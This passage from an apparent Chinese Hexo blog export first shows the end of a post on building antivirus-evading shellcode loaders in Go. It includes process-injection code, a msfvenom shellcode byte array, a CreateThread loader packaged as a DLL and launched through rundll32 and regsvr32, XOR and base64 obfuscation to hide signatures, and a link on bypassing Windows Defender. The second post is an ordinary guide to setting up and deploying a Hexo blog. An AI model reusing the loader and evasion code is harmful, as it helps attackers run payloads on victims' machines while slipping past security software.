VirtualProtectEx err:%s&quot;</span>, err.Error()))</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	_, _, err = CreateRemoteThreadEx.Call(<span class="type">uintptr</span>(openProcess), <span class="number">0</span>, <span class="number">0</span>, addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; !strings.Contains(err.Error(), <span class="string">&quot;successfully&quot;</span>) &#123;</span><br><span class="line">		<span class="built_in">panic</span>(fmt.Sprintf(<span class="string">&quot;[!] CreateRemoteThreadEx err:%s&quot;</span>, err.Error()))</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	errCloseHandle := windows.CloseHandle(openProcess)</span><br><span class="line">	<span class="keyword">if</span> errCloseHandle != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(fmt.Sprintf(<span class="string">&quot;[!] CloseHandle err:%s&quot;</span>, errCloseHandle.Error()))</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查找可以被注入的进程</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">findProcess</span><span class="params">(proc <span class="type">string</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">	processList, err := ps.Processes()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> _, p := <span class="keyword">range</span> processList &#123;</span><br><span class="line">		<span class="keyword">if</span> p.Executable() != proc &#123;</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 查询是否可以操作进程地址空间</span></span><br><span class="line">		p1, errOpenProcess := windows.OpenProcess(windows.PROCESS_VM_OPERATION, <span class="literal">false</span>, <span class="type">uint32</span>(p.Pid()))</span><br><span class="line">		<span class="keyword">if</span> errOpenProcess != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		&#125;</span><br><span class="line">		windows.CloseHandle(p1)</span><br><span class="line">		<span class="keyword">return</span> p.Pid()</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="DLL白名单"><a href="#DLL白名单" class="headerlink" title="DLL白名单"></a>DLL白名单</h2><h3 id="先决条件"><a href="#先决条件" class="headerlink" title="先决条件"></a>先决条件</h3><p>使用CGI编译成DLL，需要提前安装mingw，线程模型务必选择win32</p>
<p>已经安装的，使用<code>cpp -v</code>查看</p>
<p><img src="/golang-shellcode%E5%85%8D%E6%9D%80/4918d4dc5bf97c6ceddb058bb2d8426a.png" alt="截图"></p>
<h3 id="普通Dll导出"><a href="#普通Dll导出" class="headerlink" title="普通Dll导出"></a><rundll32>普通Dll导出</rundll32></h3><p>定义一个函数，加载shellcode，然后导出该函数，封装到dll中，下面代码中Calc函数为CGO导出的函数，首先需要import “C”，然后在要导出的DLL前添加导出标记：<code>//export &lt;函数名&gt;</code>，需要被导出的函数首字母需要大写。</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">教程地址：https://www.blackhillsinfosec.com/webcast-shellcode-execution-with-golang/</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;C&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;unsafe&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;golang.org/x/sys/windows&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// msfvenom -p windows/x64/exec CMD=calc.exe -f csharp</span></span><br><span class="line"><span class="comment">// 原始payload</span></span><br><span class="line"><span class="keyword">var</span> s = []<span class="type">byte</span>&#123;</span><br><span class="line">	<span class="number">0xfc</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xe4</span>, <span class="number">0xf0</span>, <span class="number">0xe8</span>, <span class="number">0xc0</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x51</span>, <span class="number">0x41</span>, <span class="number">0x50</span>, <span class="number">0x52</span>,</span><br><span class="line">	<span class="number">0x51</span>, <span class="number">0x56</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x60</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x18</span>, <span class="number">0x48</span>,</span><br><span class="line">	<span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x20</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x72</span>, <span class="number">0x50</span>, <span class="number">0x48</span>, <span class="number">0x0f</span>, <span class="number">0xb7</span>, <span class="number">0x4a</span>, <span class="number">0x4a</span>, <span class="number">0x4d</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>,</span><br><span class="line">	<span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0xac</span>, <span class="number">0x3c</span>, <span class="number">0x61</span>, <span class="number">0x7c</span>, <span class="number">0x02</span>, <span class="number">0x2c</span>, <span class="number">0x20</span>, <span class="number">0x41</span>, <span class="number">0xc1</span>, <span class="number">0xc9</span>, <span class="number">0x0d</span>, <span class="number">0x41</span>,</span><br><span class="line">	<span class="number">0x01</span>, <span class="number">0xc1</span>, <span class="number">0xe2</span>, <span class="number">0xed</span>, <span class="number">0x52</span>, <span class="number">0x41</span>, <span class="number">0x51</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x20</span>, <span class="number">0x8b</span>, <span class="number">0x42</span>, <span class="number">0x3c</span>, <span class="number">0x48</span>,</span><br><span class="line">	<span class="number">0x01</span>, <span class="number">0xd0</span>, <span class="number">0x8b</span>, <span class="number">0x80</span>, <span class="number">0x88</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0x74</span>, <span class="number">0x67</span>, <span class="number">0x48</span>, <span class="number">0x01</span>,</span><br><span class="line">	<span class="number">0xd0</span>, <span class="number">0x50</span>, <span class="number">0x8b</span>, <span class="number">0x48</span>, <span class="number">0x18</span>, <span class="number">0x44</span>, <span class="number">0x8b</span>, <span class="number">0x40</span>, <span class="number">0x20</span>, <span class="number">0x49</span>, <span class="number">0x01</span>, <span class="number">0xd0</span>, <span class="number">0xe3</span>, <span class="number">0x56</span>, <span class="number">0x48</span>,</span><br><span class="line">	<span class="number">0xff</span>, <span class="number">0xc9</span>, <span class="number">0x41</span>, <span class="number">0x8b</span>, <span class="number">0x34</span>, <span class="number">0x88</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xd6</span>, <span class="number">0x4d</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>,</span><br><span class="line">	<span class="number">0xac</span>, <span class="number">0x41</span>, <span class="number">0xc1</span>, <span class="number">0xc9</span>, <span class="number">0x0d</span>, <span class="number">0x41</span>, <span class="number">0x01</span>, <span class="number">0xc1</span>, <span class="number">0x38</span>, <span class="number">0xe0</span>, <span class="number">0x75</span>, <span class="number">0xf1</span>, <span class="number">0x4c</span>, <span class="number">0x03</span>, <span class="number">0x4c</span>,</span><br><span class="line">	<span class="number">0x24</span>, <span class="number">0x08</span>, <span class="number">0x45</span>, <span class="number">0x39</span>, <span class="number">0xd1</span>, <span class="number">0x75</span>, <span class="number">0xd8</span>, <span class="number">0x58</span>, <span class="number">0x44</span>, <span class="number">0x8b</span>, <span class="number">0x40</span>, <span class="number">0x24</span>, <span class="number">0x49</span>, <span class="number">0x01</span>, <span class="number">0xd0</span>,</span><br><span class="line">	<span class="number">0x66</span>, <span class="number">0x41</span>, <span class="number">0x8b</span>, <span class="number">0x0c</span>, <span class="number">0x48</span>, <span class="number">0x44</span>, <span class="number">0x8b</span>, <span class="number">0x40</span>, <span class="number">0x1c</span>, <span class="number">0x49</span>, <span class="number">0x01</span>, <span class="number">0xd0</span>, <span class="number">0x41</span>, <span class="number">0x8b</span>, <span class="number">0x04</span>,</span><br><span class="line">	<span class="number">0x88</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xd0</span>, <span class="number">0x41</span>, <span class="number">0x58</span>, <span class="number">0x41</span>, <span class="number">0x58</span>, <span class="number">0x5e</span>, <span class="number">0x59</span>, <span class="number">0x5a</span>, <span class="number">0x41</span>, <span class="number">0x58</span>, <span class="number">0x41</span>, <span class="number">0x59</span>,</span><br><span class="line">	<span class="number">0x41</span>, <span class="number">0x5a</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xec</span>, <span class="number">0x20</span>, <span class="number">0x41</span>, <span class="number">0x52</span>, <span class="number">0xff</span>, <span class="number">0xe0</span>, <span class="number">0x58</span>, <span class="number">0x41</span>, <span class="number">0x59</span>, <span class="number">0x5a</span>, <span class="number">0x48</span>,</span><br><span class="line">	<span class="number">0x8b</span>, <span class="number">0x12</span>, <span class="number">0xe9</span>, <span class="number">0x57</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x5d</span>, <span class="number">0x48</span>, <span class="number">0xba</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8d</span>, <span class="number">0x8d</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0xba</span>, <span class="number">0x31</span>, <span class="number">0x8b</span>, <span class="number">0x6f</span>,</span><br><span class="line">	<span class="number">0x87</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0xbb</span>, <span class="number">0xf0</span>, <span class="number">0xb5</span>, <span class="number">0xa2</span>, <span class="number">0x56</span>, <span class="number">0x41</span>, <span class="number">0xba</span>, <span class="number">0xa6</span>, <span class="number">0x95</span>, <span class="number">0xbd</span>, <span class="number">0x9d</span>, <span class="number">0xff</span>,</span><br><span class="line">	<span class="number">0xd5</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xc4</span>, <span class="number">0x28</span>, <span class="number">0x3c</span>, <span class="number">0x06</span>, <span class="number">0x7c</span>, <span class="number">0x0a</span>, <span class="number">0x80</span>, <span class="number">0xfb</span>, <span class="number">0xe0</span>, <span class="number">0x75</span>, <span class="number">0x05</span>, <span class="number">0xbb</span>,</span><br><span class="line">	<span class="number">0x47</span>, <span class="number">0x13</span>, <span class="number">0x72</span>, <span class="number">0x6f</span>, <span class="number">0x6a</span>, <span class="number">0x00</span>, <span class="number">0x59</span>, <span class="number">0x41</span>, <span class="number">0x89</span>, <span class="number">0xda</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x63</span>, <span class="number">0x61</span>, <span class="number">0x6c</span>,</span><br><span class="line">	<span class="number">0x63</span>, <span class="number">0x2e</span>, <span class="number">0x65</span>, <span class="number">0x78</span>, <span class="number">0x65</span>, <span class="number">0x00</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//export Calc</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Calc</span><span class="params">()</span></span> &#123;</span><br><span class="line">	method2_CreatThread(s)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法二：在进程中创建子线程</span></span><br><span class="line"><span class="comment">// method2: Creating thread in same process</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">method2_CreatThread</span><span class="params">(sc []<span class="type">byte</span>)</span></span> &#123;</span><br><span class="line">	<span class="comment">// 加载方法</span></span><br><span class="line">	kernel32 := windows.NewLazyDLL(<span class="string">&quot;kernel32.dll&quot;</span>)</span><br><span class="line">	<span class="comment">// Runtime library move Memory 用来复制内存</span></span><br><span class="line">	RtlMoveMemory := kernel32.NewProc(<span class="string">&quot;RtlMoveMemory&quot;</span>)</span><br><span class="line">	<span class="comment">// CreateThread 用来创建线程</span></span><br><span class="line">	CreateThread := kernel32.NewProc(<span class="string">&quot;CreateThread&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">//分配内存 alloc is allocation 分配的意思,已经内置在golang的windows库中</span></span><br><span class="line">	<span class="comment">//参数1：要分配的区域的起始地址 参数2:区域的大小以字节为单位 参数3:内存分配类型 参数4:访问类型</span></span><br><span class="line">	<span class="comment">// 参数3解析：要在一个步骤中保留和提交页面，请使用调用VirtualAllocMEM_COMMIT | MEM_RESERVE。</span></span><br><span class="line">	<span class="comment">// 参数4解析：区域不可执行代码，应用程序可以读写该区域。</span></span><br><span class="line">	addr, err := windows.VirtualAlloc(<span class="type">uintptr</span>(<span class="number">0</span>), <span class="type">uintptr</span>(<span class="built_in">len</span>(sc)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(fmt.Sprintf(<span class="string">&quot;[!] VirtualAllic():%s&quot;</span>, err.Error()))</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 写入内存</span></span><br><span class="line">	<span class="comment">// copy shellcode into allocated memory</span></span><br><span class="line">	RtlMoveMemory.Call(addr, <span class="type">uintptr</span>(unsafe.Pointer(&amp;sc[<span class="number">0</span>])), <span class="type">uintptr</span>(<span class="built_in">len</span>(sc)))</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> oldProtect <span class="type">uint32</span></span><br><span class="line">	<span class="comment">// 更改内存状态，之前是READWRITE(为了绕过AV),现在改成PAGE_EXECUTE_READ(为了绕过AV)</span></span><br><span class="line">	<span class="comment">// VirtualProtect:在调用进程的虚拟地址空间中更改对已提交页面区域的保护</span></span><br><span class="line">	<span class="comment">// 参数1：起始地址 参数2：内存长度 参数3：要更改的类型</span></span><br><span class="line">	<span class="comment">// 参数4：指向变量的指针，该变量接收指定页面区域中第一页的先前访问保护值。如果此参数为NULL或未指向有效变量，则函数失败。</span></span><br><span class="line">	<span class="comment">// 执行完成后，oldProtect == PAGE_READWRITE = 0x00000004 == 4</span></span><br><span class="line">	err = windows.VirtualProtect(addr, <span class="type">uintptr</span>(<span class="built_in">len</span>(sc)), windows.PAGE_EXECUTE_READ, &amp;oldProtect)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(fmt.Sprintf(<span class="string">&quot;[!] VirtualProtect():%s&quot;</span>, err.Error()))</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(oldProtect)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 创建线程，六个参数</span></span><br><span class="line">	<span class="comment">// https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread</span></span><br><span class="line">	<span class="comment">// 参数1：线程属性，确定返回的句柄是否可以被子进程继承</span></span><br><span class="line">	<span class="comment">// 参数2：堆栈的初始大小，以字节为单位，如果此参数为零，则新线程使用可执行文件的默认大小</span></span><br><span class="line">	<span class="comment">// 参数3：指向要由线程执行的应用程序定义函数的指针，即指向内存</span></span><br><span class="line">	<span class="comment">// 参数4：指向要传递给线程的变量的指针</span></span><br><span class="line">	<span class="comment">// 参数5：控制线程创建的标志。如果为0，线程在创建后立即运行。</span></span><br><span class="line">	<span class="comment">// 参数6：指向接收线程标识符的变量的指针。如果此参数为 NULL，则不返回线程标识符。</span></span><br><span class="line">	<span class="comment">// 返回值：如果函数成功，则返回值是新线程的句柄。如果函数失败，则返回值为NULL。要获取扩展的错误信息，请调用 GetLastError。</span></span><br><span class="line">	thread, _, err := CreateThread.Call(<span class="number">0</span>, <span class="number">0</span>, addr, <span class="type">uintptr</span>(<span class="number">0</span>), <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">	<span class="keyword">if</span> err.Error() != <span class="string">&quot;The operation completed successfully.&quot;</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(fmt.Sprintf(<span class="string">&quot;[!] Created Thread():%s&quot;</span>, err.Error()))</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(err.Error())</span><br><span class="line"></span><br><span class="line">	<span class="comment">//保持程序运行</span></span><br><span class="line">	_, _ = windows.WaitForSingleObject(windows.Handle(thread), <span class="number">0xFFFFFFFF</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>编译go源码，导出为gosc.dll：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">go build <span class="literal">-buildmode</span>=c<span class="literal">-shared</span> <span class="literal">-o</span> gosc.dll .\main.go</span><br></pre></td></tr></table></figure>

<p>命令执行后，会生成gosc.h文件：</p>
<p><img src="/golang-shellcode%E5%85%8D%E6%9D%80/670b01d7c8aaf7179ef58d9286b25a97.png" alt="截图"></p>
<p>可以使用dumpbin查看dll中封装的函数，dumpbin在安装visual studio时，可以勾选windows开发环境以及c++支持自动安装。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">dumpbin.exe <span class="literal">-exports</span> &lt;dll路径&gt; |more</span><br></pre></td></tr></table></figure>

<p><img src="/golang-shellcode%E5%85%8D%E6%9D%80/3a54b0f8dff089d9af4885348602faca.png" alt="截图"></p>
<p>此时可以使用rundll32.exe或者regsvr32.exe执行dll中方法。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">rundll32.exe gosc.dll,Calc</span><br></pre></td></tr></table></figure>

<h3 id="导出支持REGSVR32的DLL"><a href="#导出支持REGSVR32的DLL" class="headerlink" title="导出支持REGSVR32的DLL"></a><regsvr32>导出支持REGSVR32的DLL</regsvr32></h3><p>regsvr32运行dll则不需要加任何参数，但是对DLL的入口点有要求，需要DLL有四个入口点，这四个入口点不一定都使用，但是必须存在，我们可以只使用其中一个，四个点的返回值都是true，这四个入口点分别是：<code>EntryPoint</code>，<code>DllRegisterServer</code>，<code>DllUnregisterServer</code>，<code>DllInstall</code>，视频中推荐使用<code>DllInstall</code></p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line">使用DllInstall<span class="comment">//export EntryPoint</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">EntryPoint</span><span class="params">()</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//export DllRegisterServer</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">DllRegisterServer</span><span class="params">()</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//export DllUnregisterServer</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">DllUnregisterServer</span><span class="params">()</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//export DllInstall</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">DllInstall</span><span class="params">()</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">	method2_CreatThread(xorEncryption(s, key))</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在四个入口点分别有不同的参数去调用不同入口点，如果在<code>DllInstall</code>入口点，则使用<code>/i</code>参数调用</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">regsvr32 /i &lt;Dll路径&gt;</span><br></pre></td></tr></table></figure>

<p>其他入口点请查阅帮助：</p>
<p><img src="/golang-shellcode%E5%85%8D%E6%9D%80/1ba5a5712d7a52e9fdffab4d5f993fd5.png" alt="截图"></p>
<p>dll文件本身和普通的pe文件就有很大区别，本身就可以过很多杀软，当使用DllInstall入口时，就更加隐蔽了。</p>
<p><img src="/golang-shellcode%E5%85%8D%E6%9D%80/be733b86db706fac5bc165580ffe16bc.png" alt="截图"></p>
<h2 id="shellcode混淆，去除shellcode特征"><a href="#shellcode混淆，去除shellcode特征" class="headerlink" title="shellcode混淆，去除shellcode特征"></a>shellcode混淆，去除shellcode特征</h2><h3 id="XOR加密"><a href="#XOR加密" class="headerlink" title="XOR加密"></a>XOR加密</h3><p>如果将shellcode直接写入加载器编译，那么很容易就被杀软静态分析出来，所以这里需要对shellcode混淆，在程序执行的时候再将shellcode解密，目前比较简单的是xor加解密，也就是异或加解密，具体原理不赘述，百度搜索<code>异或交换</code>即可得到清晰明了的原理。</p>
<p>将[]byte逐位异或，也就是单字节xor加解密：</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 单字节xor加解密</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">xorEncryption</span><span class="params">(buf []<span class="type">byte</span>, xorchar <span class="type">byte</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">	<span class="keyword">var</span> res []<span class="type">byte</span> = <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="built_in">len</span>(buf))</span><br><span class="line">	<span class="keyword">for</span> index, b := <span class="keyword">range</span> buf &#123;</span><br><span class="line">		<span class="comment">//fmt.Printf(&quot;%#v &quot;, b)</span></span><br><span class="line">		res[index] = xorchar ^ b</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>buf就是shellcode，xorchar就是key，因为是xor加密，所以既可以用来加密也可以用来解密，百度搜索<code>异或交换</code>即可得到清晰明了的原理。</p>
<h3 id="base64编码shellcode"><a href="#base64编码shellcode" class="headerlink" title="base64编码shellcode"></a>base64编码shellcode</h3><figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="comment">// base64加解</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">bs64e</span><span class="params">(b1 []<span class="type">byte</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> base64.StdEncoding.EncodeToString(b1)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// base64解密</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">bs64d</span><span class="params">(s1 <span class="type">string</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">	b1, _ := base64.RawStdEncoding.DecodeString(s1)</span><br><span class="line">	<span class="keyword">return</span> b1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>还可以通过base64编码进一步加解密shellcode</p>
<h2 id="关于动态免杀"><a href="#关于动态免杀" class="headerlink" title="关于动态免杀"></a>关于动态免杀</h2><p>关于动态免杀原理和指南：</p>
<p><a href="https://labs.withsecure.com/blog/bypassing-windows-defender-runtime-scanning/">https://labs.withsecure.com/blog/bypassing-windows-defender-runtime-scanning/</a></p>
]]></content>
      <categories>
        <category>免杀</category>
      </categories>
      <tags>
        <tag>golang</tag>
        <tag>免杀</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo</title>
    <url>/hexo/</url>
    <content><![CDATA[<h2 id="部署hexo"><a href="#部署hexo" class="headerlink" title="部署hexo"></a>部署hexo</h2><p>先安装nodejs，不然没法使用npm</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 全局安装hexo</span><br><span class="line">npm install -g hexo-cli</span><br><span class="line"># 创建并初始化hexo文件夹</span><br><span class="line">hexo init &lt;文件夹&gt;</span><br><span class="line"># 进入创建好的目录</span><br><span class="line">cd &lt;文件夹&gt; </span><br><span class="line"># 使用npm安装相关依赖</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h2 id="界面美化"><a href="#界面美化" class="headerlink" title="界面美化"></a>界面美化</h2><h3 id="配置和安装主题"><a href="#配置和安装主题" class="headerlink" title="配置和安装主题"></a>配置和安装主题</h3><p>根据需求配置<code>_config.yml</code>文件，参考：</p>
<blockquote>
<p><a href="https://hexo.io/docs/configuration">https://hexo.io/docs/configuration</a></p>
</blockquote>
<p>安装主题，我这里用的是<code>next</code>：</p>
<blockquote>
<p><a href="https://github.com/next-theme/hexo-theme-next">https://github.com/next-theme/hexo-theme-next</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cd hexo-site</span><br><span class="line">$ git clone https://github.com/next-theme/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure>

<p>根据上面的链接配置完成后，可以使用<code>hexo server</code>命令启动本地服务，验证是否配置成功。</p>
</blockquote>
<h3 id="注意！"><a href="#注意！" class="headerlink" title="注意！"></a>注意！</h3><p>注意，如果安装了next主题，并且想修改相关配置，请将<code>blog\themes\next</code>目录中的<code>_config.yml</code>文件拷贝到blog根目录中，并重命名为<code>_config.next.yml</code>，然后修改<code>_config.next.yml</code>以自定义配置，这一点官方文档有说明，不然主题更新了，可能会导致配置文件被覆盖。</p>
<h3 id="对主题的深度自定义-友情链接"><a href="#对主题的深度自定义-友情链接" class="headerlink" title="对主题的深度自定义  友情链接"></a>对主题的深度自定义  友情链接</h3><blockquote>
<p><a href="https://kalialbert.github.io/article/107153072.html">https://kalialbert.github.io/article/107153072.html</a></p>
</blockquote>
<h3 id="新版本添加鼠标特效和背景特效"><a href="#新版本添加鼠标特效和背景特效" class="headerlink" title="新版本添加鼠标特效和背景特效"></a>新版本添加鼠标特效和背景特效</h3><blockquote>
<p>将特效的js代码放入<code>themes\next\source\js</code>路径中，名字自定义，我这里加了一个背景和一个点击特效</p>
<p><img src="/hexo/f9a2b0874180edb1ecb354f0eb06a5d7.png" alt="截图"></p>
<p>然后去<code>themes\next\layout</code>下去修改layout.njk的配置，引入刚才添加的js：</p>
<p><img src="/hexo/d8d57fd41691882116b4d1c4e1d05e63.png" alt="截图"></p>
</blockquote>
<h2 id="推到github上托管"><a href="#推到github上托管" class="headerlink" title="推到github上托管"></a>推到github上托管</h2><h3 id="创建github个人首页："><a href="#创建github个人首页：" class="headerlink" title="创建github个人首页："></a>创建github个人首页：</h3><p>在GitHub上创建个人仓库，仓库名称为&#96;&lt;你的github用户名&gt;.github.io</p>
<h3 id="配置config文件"><a href="#配置config文件" class="headerlink" title="配置config文件"></a>配置config文件</h3><p>还是去你自己创建的文件夹中找到<code>_config.yml</code>文件，在文件的最后，加入 如下内容</p>
<p>repo中是你刚才创建的仓库的git地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@github.com:ByZain/ByZain.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>

<h3 id="推送"><a href="#推送" class="headerlink" title="推送"></a>推送</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo g &amp; hexo d</span><br></pre></td></tr></table></figure>

<h2 id="关于图片无法显示问题"><a href="#关于图片无法显示问题" class="headerlink" title="关于图片无法显示问题"></a>关于图片无法显示问题</h2><p>修改配置文件<code>_config.yml</code>中<code>post_asset_folder的</code>值为<code>true</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">post_asset_folder: true</span><br></pre></td></tr></table></figure>

<p>进入博客目录，安装插件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install https://github.com/CodeFalling/hexo-asset-image --save</span><br></pre></td></tr></table></figure>

<p>配置完成，编写文章：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new &lt;title&gt;</span><br></pre></td></tr></table></figure>

<p>此时会在<code>blog\source\_posts</code>下生成一个<code>&lt;title&gt;.md</code>文件以及<code>&lt;title&gt;</code>文件夹</p>
<p>这时候只需要将图片放入文件夹中，md中不用加路径，直接引用即可</p>
<p>post文件夹结构：</p>
<p><img src="/hexo/3799ba45e23c5dc5ee41b6d140eb7065.png" alt="截图"></p>
<p><img src="/hexo/07f4897ad362840ac92ffb87a3886492.png" alt="截图"></p>
<p><img src="/hexo/80f59394723baa650e21c5d6ff888c0b.png" alt="截图"></p>
<h2 id="很好用的插件"><a href="#很好用的插件" class="headerlink" title="很好用的插件"></a>很好用的插件</h2><h3 id="文章加密"><a href="#文章加密" class="headerlink" title="文章加密"></a>文章加密</h3><h4 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h4><p>进入blog目录执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install --save hexo-blog-encrypt</span><br></pre></td></tr></table></figure>

<h4 id="全局设置"><a href="#全局设置" class="headerlink" title="全局设置"></a>全局设置</h4><p>设置hexo配置文件<code>_config.yml</code>，为文章设置同一的默认口令，直接追加到配置文件底部即可</p>
